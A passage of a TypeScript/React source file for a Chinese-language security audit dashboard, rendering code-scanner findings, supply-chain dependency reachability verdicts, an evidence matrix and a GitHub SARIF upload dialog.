          标记为误报并忽略
        </Button>
      </CardContent>
    </Card>
  )
}

function codeFindingReasonText(finding: CodeAuditFinding) {
  const text = `${finding.category} ${finding.rule_id} ${finding.title}`.toLowerCase()
  if (/secret|credential|token|password|密钥|凭据/.test(text)) {
    return '代码或配置中疑似存在硬编码凭据，泄露后可能被用于访问仓库、构建环境或外部服务。'
  }
  if (/command|exec|injection|注入|执行/.test(text)) {
    return '外部输入可能进入命令或代码执行路径，未经过严格校验时可能造成注入或任意执行。'
  }
  if (/deserial|pickle|yaml|反序列化/.test(text)) {
    return '不可信数据进入反序列化流程，可能触发对象构造副作用或任意代码执行。'
  }
  if (/checkov|iac|docker|terraform|配置/.test(text)) {
    return '基础设施或部署配置未满足安全规则，可能扩大服务暴露面或赋予过大权限。'
  }
  return finding.title || `${finding.category} 规则命中，需要结合代码上下文确认可利用性。`
}

function ReachabilityVerdictDashboard({
  model,
  animationKey,
}: {
  model: ReachabilityViewModel
  animationKey: number
}) {
  return (
    <div className='grid gap-4 xl:grid-cols-[minmax(0,1.55fr)_minmax(340px,0.65fr)]'>
      <div className='flex min-h-[520px] items-center rounded-md border bg-gradient-to-br from-cyan-50/70 via-background to-background p-7 dark:from-cyan-950/20 sm:p-8 xl:min-h-[560px]'>
        <div className='grid w-full items-center gap-8 xl:grid-cols-[minmax(420px,1.05fr)_minmax(500px,0.95fr)]'>
          <div className='min-w-0 space-y-6'>
            <div className='flex flex-wrap items-center gap-2'>
              <Badge variant='outline' className={cn('rounded-md', reachabilityVerdictClass(model.verdict))}>
                {model.verdictLabel}
              </Badge>
            </div>
            <h3 className='mt-3 break-words text-3xl font-semibold tracking-normal sm:text-4xl'>
              {model.targetName}
            </h3>
            <div className='grid items-center gap-7 sm:grid-cols-[176px_minmax(0,1fr)]'>
              <ReachabilityRiskDial score={model.targetRisk} verdict={model.verdict} animationKey={animationKey} />
              <ReachabilitySignalBars model={model} animationKey={animationKey} />
            </div>
          </div>
          <div className='grid grid-cols-2 gap-4 sm:grid-cols-3'>
            <ReachabilityMiniMetric label='引用命中' value={model.importHits} tone='cyan' />
            <ReachabilityMiniMetric label='入口命中' value={model.entryHits} tone='orange' />
            <ReachabilityMiniMetric label='执行证据' value={model.executionHits} tone='red' />
            <ReachabilityMiniMetric label='日志印证' value={model.runtimeHits} tone='emerald' />
            <ReachabilityMiniMetric label='攻击链关联' value={model.graphHits} tone='cyan' />
            <ReachabilityMiniMetric label='证据缺口' value={model.gapCount} tone='amber' />
          </div>
        </div>
      </div>

      <div className='rounded-md border p-4'>
        <div className='mb-3 flex items-center gap-2 text-sm font-semibold'>
          <PackageCheck className='size-4 text-cyan-600' />
          当前验证对象
        </div>
        <div className='space-y-2 text-sm'>
          <InfoPill label='版本' value={model.targetVersion || '未知'} />
          <InfoPill label='风险原因' value={model.targetReason} />
          <InfoPill label='来源文件' value={model.targetDependency?.source_file || '等待供应链扫描'} />
        </div>
      </div>
    </div>
  )
}

function ReachabilityRiskDial({
  score,
  verdict,
  animationKey,
}: {
  score: number
  verdict: ReachabilityVerdict
  animationKey: number
}) {
  const reducedMotion = useReducedMotion()
  const normalized = Math.max(0, Math.min(100, Math.round(score || 0)))
  const circumference = 2 * Math.PI * 45
  const { value: displayScore, spring } = useAnimatedNumber(normalized, {
    stiffness: 34,
    damping: 13,
    delayMs: 520,
    durationMs: 3200,
    respectReducedMotion: false,
    resetKey: animationKey,
  })
  const progress = useTransform(spring, [0, 100], [0, 1])
  const dashOffset = useTransform(progress, (value) => circumference * (1 - Math.max(0, Math.min(1, value))))
  const pulseOpacity = useTransform(progress, [0, 0.7, 1], [0.06, 0.18, 0.3])
  const pulseScale = useTransform(progress, [0, 1], [0.92, 1.04])
  const strokeClass =
    verdict === 'confirmed'
      ? 'stroke-red-500'
      : verdict === 'suspected'
        ? 'stroke-orange-500'
        : verdict === 'not_reachable'
          ? 'stroke-cyan-500'
          : 'stroke-slate-400'

  return (
    <div className='relative size-40 shrink-0 sm:size-44'>
      <motion.div
        className={cn(
          'absolute inset-3 rounded-full blur-lg',
          verdict === 'confirmed'
            ? 'bg-red-500'
            : verdict === 'suspected'
              ? 'bg-orange-500'
              : verdict === 'not_reachable'
                ? 'bg-cyan-500'
                : 'bg-slate-400'
        )}
        style={{ opacity: reducedMotion ? 0.18 : pulseOpacity, scale: reducedMotion ? 1 : pulseScale }}
      />
      <svg viewBox='0 0 112 112' className='size-full -rotate-90'>
        <circle
          cx='56'
          cy='56'
          r='45'
          className='fill-none stroke-muted'
          strokeWidth='12'
        />
        <motion.circle
          cx='56'
          cy='56'
          r='45'
          className={cn('fill-none', strokeClass)}
          strokeWidth='12'
          strokeLinecap='round'
          strokeDasharray={circumference}
          style={{ strokeDashoffset: dashOffset }}
        />
      </svg>
      <div className='absolute inset-0 grid place-items-center'>
        <div className='text-center'>
          <div className='text-4xl font-semibold leading-none sm:text-5xl'>{displayScore}</div>
          <div className='mt-2 text-sm text-muted-foreground'>风险分</div>
        </div>
      </div>
    </div>
  )
}

function ReachabilitySignalBars({ model, animationKey }: { model: ReachabilityViewModel; animationKey: number }) {
  const signals = [
    { label: '代码', value: model.importHits + model.entryHits, tone: 'bg-cyan-500' },
    { label: '执行', value: model.executionHits + model.runtimeHits, tone: 'bg-red-500' },
    { label: '图谱', value: model.graphHits, tone: 'bg-emerald-500' },
    { label: '缺口', value: model.gapCount, tone: 'bg-amber-500' },
  ]
  const maxValue = Math.max(1, ...signals.map((signal) => signal.value))

  return (
    <div className='space-y-4'>
      {signals.map((signal) => (
        <ReachabilitySignalBar key={signal.label} signal={signal} maxValue={maxValue} animationKey={animationKey} />
      ))}
    </div>
  )
}

function ReachabilitySignalBar({
  signal,
  maxValue,
  animationKey,
}: {
  signal: { label: string; value: number; tone: string }
  maxValue: number
  animationKey: number
}) {
  const { value: displayValue, spring } = useAnimatedNumber(signal.value, {
    stiffness: 42,
    damping: 15,
    delayMs: 700,
    durationMs: 3000,
    respectReducedMotion: false,
    resetKey: `${animationKey}-${signal.label}`,
  })
  const width = useTransform(spring, (latest) => {
    if (signal.value <= 0) return '0%'
    return `${Math.max(8, (Math.max(0, latest) / Math.max(1, maxValue)) * 100)}%`
  })

  return (
    <div className='grid grid-cols-[56px_minmax(0,1fr)_40px] items-center gap-4 text-base'>
      <div className='text-muted-foreground'>{signal.label}</div>
      <div className='h-3 overflow-hidden rounded-full bg-muted'>
        <motion.div
          className={cn('h-full rounded-full', signal.tone)}
          style={{ width }}
        />
      </div>
      <div className='text-right text-lg font-semibold'>{displayValue}</div>
    </div>
  )
}

function ReachabilityMiniMetric({
  label,
  value,
  tone,
}: {
  label: string
  value: number
  tone: 'cyan' | 'red' | 'orange' | 'amber' | 'emerald'
}) {
  const toneClass = {
    cyan: 'text-cyan-600',
    red: 'text-red-600',
    orange: 'text-orange-600',
    amber: 'text-amber-600',
    emerald: 'text-emerald-600',
  }[tone]
  return (
    <div className='flex min-h-28 flex-col justify-center rounded-md border bg-background/80 px-5 py-4'>
      <div className='text-sm text-muted-foreground'>{label}</div>
      <div className={cn('mt-2 text-3xl font-semibold', toneClass)}>{value}</div>
    </div>
  )
}

function ReachabilityPathGraph({
  model,
  scanning,
  onScan,
}: {
  model: ReachabilityViewModel
  scanning: boolean
  onScan: () => void
}) {
  if (!model.hasCodeAudit) {
    return (
      <Card className={moduleCardClass}>
        <CardContent className='flex min-h-[260px] flex-col items-center justify-center gap-3 p-8 text-center'>
          <div className='flex size-12 items-center justify-center rounded-md border bg-cyan-50 text-cyan-700 dark:bg-cyan-950/30 dark:text-cyan-300'>
            <Route className='size-6' />
          </div>
          <div>
            <h3 className='text-lg font-semibold'>还没有代码扫描结果</h3>
          </div>
          <Button className={actionButtonClass} onClick={onScan} disabled={scanning}>
            {scanning ? <Loader2 className='animate-spin' /> : <RefreshCw />}
            验证当前风险可达性
          </Button>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card className='rounded-md'>
      <CardHeader>
        <CardTitle className='flex items-center gap-2 text-base'>
          <Route className='size-4 text-cyan-600' />
          风险触达路径图
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className='overflow-x-auto pb-2'>
          <div className='grid min-w-[1560px] gap-3' style={{ gridTemplateColumns: `repeat(${model.pathNodes.length}, minmax(260px, 1fr))` }}>
            {model.pathNodes.map((node, index) => (
              <div key={node.id} className='relative'>
                {index < model.pathNodes.length - 1 ? (
                  <div className='absolute left-[calc(100%-10px)] top-10 hidden h-0.5 w-5 bg-cyan-300 lg:block' />
                ) : null}
                <div className={cn('flex h-full min-h-[124px] flex-col rounded-md border bg-background p-3 shadow-sm', reachabilityNodeClass(node.status))}>
                  <div className='flex items-start justify-between gap-2'>
                    <div className='flex min-w-0 items-center gap-2'>
                      <div className='flex size-9 items-center justify-center rounded-md border bg-background'>
                        {node.icon}
                      </div>
                      <div className='min-w-0'>
                        <div className='text-base font-semibold leading-6'>{node.title}</div>
                      </div>
                    </div>
                    <Badge variant='outline' className={cn('rounded-md bg-background/80', reachabilityNodeBadgeClass(node.status))}>
                      {reachabilityNodeStatusLabel(node.status)}
                    </Badge>
                  </div>
                  <div className='mt-auto rounded-md bg-muted/35 px-2 py-2 text-xs leading-5'>
                    {node.evidence}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function ReachabilityEvidenceMatrix({ model }: { model: ReachabilityViewModel }) {
  const columns = ['依赖证据', '代码引用', '构建脚本', '运行日志', '外部告警', '攻击链']
  return (
    <Card className='rounded-md'>
      <CardHeader>
        <CardTitle className='flex items-center gap-2 text-section-title'>
          <Fingerprint className='size-5 text-cyan-600' />
          证据覆盖矩阵
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className='overflow-x-auto rounded-md border'>
          <div className='min-w-[860px]'>
            <div className='grid border-b bg-muted/35 text-label' style={{ gridTemplateColumns: `220px repeat(${columns.length}, minmax(96px, 1fr))` }}>
              <div className='p-3'>风险信号</div>
              {columns.map((column) => <div key={column} className='border-l p-3 text-center'>{column}</div>)}
            </div>
            {model.matrixRows.map((row) => (
              <div key={row.id} className='grid border-b last:border-b-0' style={{ gridTemplateColumns: `220px repeat(${columns.length}, minmax(96px, 1fr))` }}>
                <div className='p-3 text-sm font-medium'>{row.signal}</div>
                {row.cells.map((cell, index) => (
                  <div key={`${row.id}-${index}`} className='border-l p-2'>
                    <div className={cn('rounded-md px-2 py-2 text-center text-xs font-medium', reachabilityMatrixCellClass(cell.status))} title={cell.detail}>
                      {cell.label}
                    </div>
                  </div>
                ))}
              </div>
            ))}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function ReachabilityGapPanel({
  model,
  scanning,
  onScan,
}: {
  model: ReachabilityViewModel
  scanning: boolean
  onScan: () => void
}) {
  return (
    <Card className='rounded-md'>
      <CardHeader>
        <CardTitle className='flex items-center gap-2 text-base'>
          <AlertTriangle className='size-4 text-amber-600' />
          证据缺口与下一步
        </CardTitle>
      </CardHeader>
      <CardContent className='space-y-3'>
        {model.gaps.map((gap) => (
          <div key={gap} className='rounded-md border border-amber-200 bg-amber-50 px-3 py-2 text-sm leading-6 text-amber-900 dark:border-amber-900 dark:bg-amber-950/25 dark:text-amber-200'>
            {gap}
          </div>
        ))}
        <div className='grid gap-2'>
          <Button className={actionButtonClass} onClick={onScan} disabled={scanning}>
            {scanning ? <Loader2 className='animate-spin' /> : <RefreshCw />}
            验证当前风险可达性
          </Button>
          <Button variant='outline' onClick={() => jumpToPlatformTab('logs')}>
            <FileSearch />
            上传运行日志印证
          </Button>
          <Button variant='outline' onClick={() => jumpToPlatformTab('graph')}>
            <Network />
            查看攻击链地图
          </Button>
        </div>
      </CardContent>
    </Card>
  )
}

function ScannerContributionPanel({
  scanners,
  findings,
}: {
  scanners: CodeAuditScanner[]
  findings: CodeAuditFinding[]
}) {
  const scannerNames = ['Semgrep CE', 'Gitleaks', 'Bandit', 'Checkov']
  const scannerMap = new Map(scanners.map((scanner) => [scanner.name.toLowerCase(), scanner]))
  return (
    <div className='grid gap-3 md:grid-cols-2 xl:grid-cols-4'>
      {scannerNames.map((name) => {
        const scanner = scannerMap.get(name.toLowerCase()) ?? scanners.find((item) => item.name.toLowerCase().includes(name.toLowerCase().split(' ')[0]))
        const scannerFindings = findings.filter((finding) => finding.scanner.toLowerCase().includes(name.toLowerCase().split(' ')[0]))
        return (
          <div key={name} className='rounded-md border p-3'>
            <div className='flex items-center justify-between gap-2'>
              <div className='font-medium'>{name}</div>
              <Badge variant='outline' className={scannerBadgeClass(scanner?.state, Boolean(scanner?.available))}>
                {scannerStateLabel(scanner?.state, Boolean(scanner?.available))}
              </Badge>
            </div>
            <p className='mt-2 min-h-[42px] text-xs leading-5 text-muted-foreground'>
              {scannerContributionText(name, scannerFindings.length)}
            </p>
            <div className='mt-3 flex items-center justify-between text-xs text-muted-foreground'>
              <span>贡献发现</span>
              <span className='font-semibold text-foreground'>{scannerFindings.length}</span>
            </div>
          </div>
        )
      })}
    </div>
  )
}

function CodeFindingTable({
  findings,
  mutating,
  auditExists,
  onIgnore,
}: {
  findings: CodeAuditFinding[]
  mutating: boolean
  auditExists: boolean
  onIgnore: (fingerprint: string) => void
}) {
  if (!findings.length) {
    return (
      <div className='rounded-md border border-dashed p-6 text-center text-sm text-muted-foreground'>
        {auditExists ? '未发现匹配的代码安全风险。' : '扫描后将在这里显示风险明细。'}
      </div>
    )
  }

  return (
    <Table>
      <TableHeader>
        <TableRow>
          <TableHead>等级</TableHead>
          <TableHead>类型</TableHead>
          <TableHead>位置</TableHead>
          <TableHead>证据</TableHead>
          <TableHead>修复建议</TableHead>
          <TableHead className='w-[76px]'>处理</TableHead>
        </TableRow>
      </TableHeader>
      <TableBody>
        {findings.map((finding) => (
          <TableRow key={finding.fingerprint || `${finding.id}-${finding.line}`}>
            <TableCell>
              <Badge variant='outline' className={cn('rounded-md', severityClasses[finding.severity])}>
                {severityLabels[finding.severity]}
              </Badge>
            </TableCell>
            <TableCell>
              <div className='font-medium'>{finding.category}</div>
              <div className='text-xs text-muted-foreground'>{finding.scanner}</div>
            </TableCell>
            <TableCell className='min-w-[180px] font-mono text-xs'>
              {finding.risk_file}:{finding.line}
            </TableCell>
            <TableCell className='max-w-[320px]'>
              <code className='line-clamp-2 rounded bg-muted px-2 py-1 text-xs'>{finding.evidence}</code>
            </TableCell>
            <TableCell className='max-w-[360px] text-sm leading-6'>{finding.recommendation}</TableCell>
            <TableCell>
              <Button variant='ghost' size='icon' title='标记为误报并忽略' disabled={mutating} onClick={() => onIgnore(finding.fingerprint)}>
                <EyeOff className='size-4' />
              </Button>
            </TableCell>
          </TableRow>
        ))}
      </TableBody>
    </Table>
  )
}

function GitHubCodeScanningDialog({
  open,
  onOpenChange,
  owner,
  setOwner,
  repo,
  setRepo,
  refName,
  setRefName,
  commit,
  setCommit,
  token,
  setToken,
  uploading,
  result,
  onUpload,
  onRefresh,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  owner: string
  setOwner: (value: string) => void
  repo: string
  setRepo: (value: string) => void
  refName: string
  setRefName: (value: string) => void
  commit: string
  setCommit: (value: string) => void
  token: string
  setToken: (value: string) => void
  uploading: boolean
  result: GitHubCodeScanningUploadResult | null
  onUpload: () => void
  onRefresh: () => void
}) {
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className='sm:max-w-xl'>
        <DialogHeader>
          <DialogTitle className='flex items-center gap-2'>
            <IconGithub className='size-4' />
            GitHub Code Scanning
          </DialogTitle>
          <DialogDescription>
            上传当前审计 SARIF 到仓库 Security / Code scanning alerts。
          </DialogDescription>
        </DialogHeader>
        <div className='grid gap-4'>
          <div className='grid gap-3 sm:grid-cols-2'>
            <div className='space-y-2'>
              <Label htmlFor='github-owner'>Owner</Label>
              <Input id='github-owner' value={owner} onChange={(event) => setOwner(event.target.value)} />
            </div>
            <div className='space-y-2'>
              <Label htmlFor='github-repo'>Repo</Label>
              <Input id='github-repo' value={repo} onChange={(event) => setRepo(event.target.value)} />
            </div>
          </div>
          <div className='space-y-2'>
            <Label htmlFor='github-ref'>Git ref</Label>
            <Input id='github-ref' value={refName} onChange={(event) => setRefName(event.target.value)} />
          </div>
          <div className='space-y-2'>
            <Label htmlFor='github-commit'>Commit SHA</Label>
            <Input
              id='github-commit'
              value={commit}
              placeholder='留空则由后端读取当前 HEAD'
              onChange={(event) => setCommit(event.target.value)}
            />
          </div>
          <div className='space-y-2'>
            <Label htmlFor='github-token'>Token</Label>
            <Input
              id='github-token'
              type='password'
              value={token}
              placeholder='留空则使用后端 GITHUB_TOKEN / GH_TOKEN'
              onChange={(event) => setToken(event.target.value)}
            />
          </div>
          {result ? (
            <div className='rounded-md border p-3 text-sm'>
              <div className='flex items-center justify-between gap-3'>
                <span className='font-medium'>{result.repository}</span>
                <Badge variant='outline' className={statusClasses.active}>
                  {result.status}
                </Badge>
              </div>
              <div className='mt-2 break-all text-xs text-muted-foreground'>
                SARIF ID: {result.sarif_id || '-'}
              </div>
              <div className='mt-1 break-all text-xs text-muted-foreground'>
                {result.commit_sha}
              </div>
            </div>
          ) : null}
        </div>
        <DialogFooter>
          <Button variant='outline' onClick={onRefresh} disabled={uploading || !result?.sarif_id}>
            {uploading ? <Loader2 className='animate-spin' /> : <RefreshCw />}
            刷新状态
          </Button>
          <Button onClick={onUpload} disabled={uploading || !owner.trim() || !repo.trim() || !refName.trim()}>
            {uploading ? <Loader2 className='animate-spin' /> : <IconGithub />}
            上传 SARIF
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

function AuditMetric({
  label,
  value,
  tone,
}: {
  label: string
  value: number
  tone: 'cyan' | 'red' | 'orange' | 'amber' | 'emerald' | 'slate'
}) {
  const { value: animatedValue } = useAnimatedNumber(value, {
    stiffness: 85,
    damping: 18,
    durationMs: 620,
    resetKey: `${label}-${value}`,
  })
  const toneClass = {
    cyan: 'text-cyan-600',
    red: 'text-red-600',
    orange: 'text-orange-600',
    amber: 'text-amber-600',
    emerald: 'text-emerald-600',
    slate: 'text-slate-600',
  }[tone]

  return (
    <motion.div
      className='rounded-md border border-border/80 bg-card/90 p-4 transition-colors duration-200 hover:border-cyan-400/25 hover:bg-muted/20'
      initial={{ opacity: 0.88, y: 4 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.18, ease: 'easeOut' }}
    >
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className={cn('mt-2 text-2xl font-semibold tabular-nums', toneClass)}>{Math.round(animatedValue)}</div>
    </motion.div>
  )
}

function ScannerStatusList({ scanners }: { scanners: CodeAuditScanner[] }) {
  if (!scanners.length) {
    return (
      <div className='rounded-md border border-dashed p-3 text-sm text-muted-foreground'>
        扫描后将在这里显示引擎状态。
      </div>
    )
  }

  return (
    <div className='space-y-2'>
      {scanners.map((scanner) => (
        <div key={`${scanner.name}-${scanner.command}`} className='rounded-md border p-3'>
          <div className='flex items-center justify-between gap-3'>
            <div className='font-medium'>{scanner.name}</div>
            <Badge
              variant='outline'
              className={scannerBadgeClass(scanner.state, scanner.available)}
            >
              {scannerStateLabel(scanner.state, scanner.available)}
            </Badge>
          </div>
          <div className='mt-2 truncate text-xs text-muted-foreground'>
            {scanner.version || scanner.command}
          </div>
          {scanner.error ? (
            <div className='mt-2 line-clamp-2 text-xs text-orange-600'>{scanner.error}</div>
          ) : null}
        </div>
      ))}
    </div>
  )
}

function buildReachabilityViewModel(workspace: SecurityWorkspace): ReachabilityViewModel {
  const dependencyCandidates = [
    ...(workspace.dependency_audit?.dependencies ?? []),
    ...(workspace.dependencies ?? []),
  ]
  const targetDependency = dependencyCandidates
    .filter((dependency) => dependency.risk > 0 || dependency.signals?.length || dependency.reachability)
    .sort((left, right) => right.risk - left.risk)[0]
  const codeFindings = workspace.code_audit?.findings ?? []
  const reachability = targetDependency?.reachability
  const dependencyName = targetDependency?.name || workspace.dependency_audit?.findings?.[0]?.dependency || '等待供应链风险'
  const importHits = Number(reachability?.imported || false) + (reachability?.import_candidates?.length ?? 0) + (reachability?.code_evidence?.length ?? 0)
  const callHits = Number(reachability?.called || false) + (reachability?.call_evidence?.length ?? 0)
  const entryHits = Number(reachability?.attack_surface || false) + (reachability?.attack_surface_evidence?.length ?? 0)
  const executionHits = callHits + entryHits + codeFindings.filter((finding) => isExecutionLikeFinding(finding)).length
  const runtimeHits = Number(reachability?.runtime_trace || false)
    + (reachability?.runtime_evidence?.length ?? 0)
    + (workspace.log_audit?.summary.finding_count ?? 0)
    + (workspace.dependency_audit?.summary.reachability?.runtime_log_findings ?? 0)
  const graphHits = (workspace.graph?.attack_paths ?? []).filter((path) => {
    if (!targetDependency?.name) return false
    const text = attackPathSearchText(path)
    return dependencySearchTokens(targetDependency).some((token) => text.includes(token))
  }).length
  const hasDependencyAudit = Boolean(workspace.dependency_audit?.scan_id || dependencyCandidates.length)
  const hasCodeAudit = Boolean(workspace.code_audit?.scan_id)
  const hasDependencyRisk = Boolean(targetDependency || workspace.dependency_audit?.findings?.length)
  const hasCodeEntry = importHits + entryHits + executionHits > 0
  const hasRuntimeOrGraph = runtimeHits + graphHits > 0
  const verdict: ReachabilityVerdict =
    !hasDependencyAudit || !hasCodeAudit
      ? 'pending'
      : hasDependencyRisk && hasCodeEntry && hasRuntimeOrGraph
        ? 'confirmed'
        : hasDependencyRisk && hasCodeEntry
          ? 'suspected'
          : hasDependencyRisk
            ? 'not_reachable'
            : 'pending'
  const gaps = reachabilityGaps({
    hasDependencyAudit,
    hasCodeAudit,
    importHits,
    entryHits,
    executionHits,
    runtimeHits,
    graphHits,
  })
  const pathNodes = buildReachabilityPathNodes({
    targetDependency,
    dependencyName,
    reachability,
    codeFindings,
    importHits,
    entryHits,
    executionHits,
    runtimeHits,
    graphHits,
  })
  const matrixRows = buildReachabilityMatrixRows({
    targetDependency,
    dependencyName,
    codeFindings,
    importHits,
    entryHits,
    executionHits,
    runtimeHits,
    graphHits,
    hasDependencyAudit,
  })

  return {
    verdict,
    verdictLabel: reachabilityVerdictLabel(verdict),
    verdictDescription: reachabilityVerdictDescription(verdict, dependencyName),
    targetDependency,
    targetName: targetDependency ? `${targetDependency.name}@${targetDependency.version || 'unknown'}` : dependencyName,
    targetVersion: targetDependency?.version || '',
    targetRisk: targetDependency?.risk ?? workspace.dependency_audit?.summary.risk_score ?? 0,
    targetReason: targetDependency?.signals?.join('、') || targetDependency?.recommendation || '等待供应链风险发现结果',
    importHits,
    entryHits,
    executionHits,
    runtimeHits,
    graphHits,
    gapCount: gaps.length,
    gaps,
    pathNodes,
    matrixRows,
    codeFindings,
    logFindingCount: workspace.log_audit?.summary.finding_count ?? 0,
    hasDependencyAudit,
    hasCodeAudit,
  }
}

function dependencySearchTokens(dependency: SecurityDependency): string[] {
  const name = dependency.name?.toLowerCase()
  const version = dependency.version?.toLowerCase()
  const ecosystem = dependency.ecosystem?.toLowerCase()
  return [
    name,
    version && name ? `${name}@${version}` : '',
    ecosystem && name ? `${ecosystem}:${name}` : '',
    ecosystem && name && version ? `${ecosystem}:${name}@${version}` : '',
    ecosystem && name && version ? `pkg:${ecosystem}/${name}@${version}` : '',
    dependency.purl?.toLowerCase(),
  ].filter(Boolean) as string[]
}

function attackPathSearchText(path: KnowledgeGraphAttackPath): string {
  return JSON.stringify(path).toLowerCase()
}

function buildReachabilityPathNodes({
  targetDependency,
  dependencyName,
  reachability,
  codeFindings,
  importHits,
  entryHits,
  executionHits,
  runtimeHits,
  graphHits,
}: {
  targetDependency?: SecurityDependency
  dependencyName: string
  reachability?: SecurityDependency['reachability']
  codeFindings: CodeAuditFinding[]
  importHits: number
  entryHits: number
  executionHits: number
  runtimeHits: number
  graphHits: number
}): ReachabilityPathNode[] {
  const firstCodeEvidence = reachability?.code_evidence?.[0] ?? reachability?.call_evidence?.[0]
  const firstEntryEvidence = reachability?.attack_surface_evidence?.[0]
  const firstRuntimeEvidence = reachability?.runtime_evidence?.[0]
  const firstFinding = codeFindings[0]
  return [
    {
      id: 'dependency',
      title: '可疑依赖',
      description: targetDependency?.recommendation || '供应链风险发现页识别出的最高风险依赖或组件。',
      status: targetDependency ? 'risk' : 'missing',
      evidence: targetDependency ? `${targetDependency.ecosystem} · ${targetDependency.source_file || 'SBOM/manifest'}` : '等待供应链扫描',
      icon: <Boxes className='size-4 text-orange-600' />,
    },
    {
      id: 'reference',
      title: '代码引用',
      description: firstCodeEvidence?.snippet || firstFinding?.evidence || '检查 import/require、函数调用、脚本引用和配置项。',
      status: importHits > 0 ? 'found' : 'missing',
      evidence: importHits > 0 ? `${importHits} 条引用线索` : '未发现引用证据',
      icon: <Code2 className='size-4 text-cyan-600' />,
    },
    {
      id: 'entry',
      title: '入口路径',
      description: firstEntryEvidence?.snippet || firstEntryEvidence?.evidence || '判断风险是否连接到 API、CLI、postinstall、workflow 或服务入口。',
      status: entryHits > 0 ? 'found' : executionHits > 0 ? 'pending' : 'missing',
      evidence: entryHits > 0 ? `${entryHits} 条入口证据` : executionHits > 0 ? '有执行线索，缺入口定位' : '缺入口证据',
      icon: <Route className='size-4 text-violet-600' />,
    },
    {
      id: 'execution',
      title: '执行证据',
      description: firstFinding?.recommendation || '用 Semgrep、Checkov、Bandit 等扫描结果验证脚本或配置是否可能执行。',
      status: executionHits > 0 ? 'risk' : 'pending',
      evidence: executionHits > 0 ? `${executionHits} 条执行/配置线索` : '等待扫描器佐证',
      icon: <TerminalSquare className='size-4 text-red-600' />,
    },
    {
      id: 'runtime',
      title: '运行印证',
      description: firstRuntimeEvidence?.event || firstRuntimeEvidence?.evidence || '用运行日志、WAF/EDR、DNS 或外联事件确认风险是否真实触达。',
      status: runtimeHits > 0 ? 'confirmed' : 'pending',
      evidence: runtimeHits > 0 ? `${runtimeHits} 条运行期证据` : '缺少运行日志印证',
      icon: <ServerCog className='size-4 text-emerald-600' />,
    },
    {
      id: 'graph',
      title: '攻击链关联',
      description: `${dependencyName} 是否已经进入攻击链地图中的候选路径。`,
      status: graphHits > 0 ? 'found' : 'pending',
      evidence: graphHits > 0 ? `已进入 ${graphHits} 条候选路径，待最终确认` : '可在攻击链地图中继续补证',
      icon: <Network className='size-4 text-blue-600' />,
    },
  ]
}

function buildReachabilityMatrixRows({
  targetDependency,
  dependencyName,
  codeFindings,
  importHits,
  entryHits,
  executionHits,
  runtimeHits,
  graphHits,
  hasDependencyAudit,
}: {
  targetDependency?: SecurityDependency
  dependencyName: string
  codeFindings: CodeAuditFinding[]
  importHits: number
  entryHits: number
  executionHits: number
  runtimeHits: number
  graphHits: number
  hasDependencyAudit: boolean
}): ReachabilityMatrixRow[] {
  const primarySignal = targetDependency?.signals?.[0] || codeFindings[0]?.category || '供应链风险'
  const rows = [
    {
      id: 'target',
      signal: dependencyName,
      dependency: hasDependencyAudit,
      code: importHits > 0,
      build: entryHits + executionHits > 0,
      runtime: runtimeHits > 0,
      alert: false,
      graph: graphHits > 0,
    },
    {
      id: 'signal',
      signal: primarySignal,
      dependency: Boolean(targetDependency),
      code: codeFindings.length > 0,
      build: executionHits > 0,
      runtime: runtimeHits > 0,
      alert: false,
      graph: graphHits > 0,
    },
  ]
  return rows.map((row) => ({
    id: row.id,
    signal: row.signal,
    cells: [
      matrixCell(row.dependency, '已命中', '待补充', '来自 SBOM、VEX、lockfile 或依赖详情'),
      matrixCell(row.code, '已命中', '待补充', '来自 import/call、SARIF 或代码扫描'),
      matrixCell(row.build, '已命中', '待补充', '来自脚本、workflow、Dockerfile 或 IaC 配置'),
      matrixCell(row.runtime, '已命中', '待补充', '来自 access/app/EDR/WAF/DNS 日志'),
      { label: '可选', status: 'na', detail: '外部告警证据可进一步增强结论' },
      matrixCell(row.graph, '候选关联', '待补充', '来自攻击链地图候选路径'),
    ],
  }))
}

function matrixCell(hit: boolean, hitLabel: string, gapLabel: string, detail: string): ReachabilityMatrixCell {
  return { label: hit ? hitLabel : gapLabel, status: hit ? 'hit' : 'gap', detail }
}

function reachabilityGaps({
  hasDependencyAudit,
  hasCodeAudit,
  importHits,
  entryHits,
  executionHits,
  runtimeHits,
  graphHits,
}: {
  hasDependencyAudit: boolean
  hasCodeAudit: boolean
  importHits: number
  entryHits: number
  executionHits: number
  runtimeHits: number
  graphHits: number
}) {
  const gaps: string[] = []
  if (!hasDependencyAudit) gaps.push('缺少供应链风险发现结果，无法确定要验证的依赖或组件。')
  if (!hasCodeAudit) gaps.push('缺少代码扫描结果，无法确认 import、脚本、配置或入口路径。')
  if (hasCodeAudit && importHits === 0) gaps.push('还没有找到代码引用证据，建议检查源码、lockfile 和构建脚本。')
  if (hasCodeAudit && entryHits === 0 && executionHits === 0) gaps.push('缺少入口或执行证据，建议补充 workflow、Dockerfile、postinstall 或路由信息。')
  if (runtimeHits === 0) gaps.push('缺少运行期日志印证，建议上传 access/app/EDR/WAF/DNS 日志。')
  if (graphHits === 0) gaps.push('尚未进入候选攻击链，建议补齐关键证据后在攻击链地图中复核。')
  return gaps.length ? gaps : ['当前可达性证据较完整，可继续导出报告或做处置验证。']
}

function reachabilityVerdictLabel(verdict: ReachabilityVerdict) {
  if (verdict === 'confirmed') return '已触达'
  if (verdict === 'suspected') return '疑似可达'
  if (verdict === 'not_reachable') return '暂不可达'
  return '待验证'
}

function reachabilityVerdictDescription(verdict: ReachabilityVerdict, targetName: string) {
  if (verdict === 'confirmed') return `${targetName} 已经同时具备依赖风险、代码/入口线索和运行或攻击链印证，可以作为高可信溯源证据。`
  if (verdict === 'suspected') return `${targetName} 已经发现代码引用或执行入口，但还缺少运行日志或攻击链印证。`
  if (verdict === 'not_reachable') return `${targetName} 有供应链风险，但当前没有发现代码引用、脚本入口或执行证据。`
